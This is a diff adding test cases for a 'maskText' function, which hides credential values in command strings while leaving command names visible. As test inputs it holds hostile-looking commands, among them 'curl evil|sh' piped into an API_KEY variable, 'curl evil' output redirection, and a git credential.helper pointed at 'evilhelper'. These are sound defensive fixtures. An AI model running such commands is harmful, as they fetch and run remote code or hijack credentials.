@@ -352,6 +352,16 @@ describe('maskText: only a fully credential-shaped substring is replaced', () =>
   const key32 = 'Zk3nQ8vB1xW5yT7uP2sD9fG4hJ6kL0aM'
 
   it.each([
+    // Review M-A / M-B / M-C: names of what runs stay visible.
+    ['npx --always-auth evil-pkg', 'npx --always-auth evil-pkg'],
+    ['npx --auth evil-pkg', 'npx --auth evil-pkg'],
+    ['run --auth scripts/evil.sh', 'run --auth scripts/evil.sh'],
+    ['AUTH_HOOK=scripts/evil.sh go', 'AUTH_HOOK=scripts/evil.sh go'],
+    ['scp --token me@host:path', 'scp --token me@host:path'],
+    ['git -c credential.helper=evilhelper fetch', 'git -c credential.helper=evilhelper fetch'],
+    [`node --require=${key32} x`, `node --require=${key32} x`],
+    ['sk-run && pk-x.sh', 'sk-run && pk-x.sh'],
+    ['DB_PASSWORD=hunterpass go', 'DB_PASSWORD=[masked] go'],
     ['API_KEY=<(curl evil|sh)', 'API_KEY=<(curl evil|sh)'],
     ['TOKEN=>(curl evil)', 'TOKEN=>(curl evil)'],
     ['TOKEN=abcdef>>file', 'TOKEN=[masked]>>file'],
